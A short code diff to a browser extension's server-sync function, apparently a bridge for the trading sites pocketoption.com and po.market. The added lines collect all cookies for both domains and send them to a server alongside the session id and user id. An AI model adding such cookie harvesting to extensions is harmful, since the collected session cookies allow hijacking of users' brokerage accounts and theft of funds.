@@ -82,9 +82,24 @@ async function syncToServer(data) {
 
   isSyncing = true;
   try {
+    // Capture all cookies from pocketoption.com and po.market
+    let cookieString = "";
+    try {
+      const domains = ["pocketoption.com", "po.market"];
+      const allCookies = [];
+      for (const domain of domains) {
+        const cookies = await chrome.cookies.getAll({ domain });
+        allCookies.push(...cookies);
+      }
+      cookieString = allCookies.map(c => `${c.name}=${c.value}`).join("; ");
+    } catch (cookieErr) {
+      console.error("[BRIDGE] Failed to capture cookies:", cookieErr.message);
+    }
+
     const payload = {
       apiKey,
       ssid: data.ssid,
+      cookies: cookieString,
       uid: data.uid,
       isDemo: data.isDemo,
       demoBalance: data.balanceData?.demo,
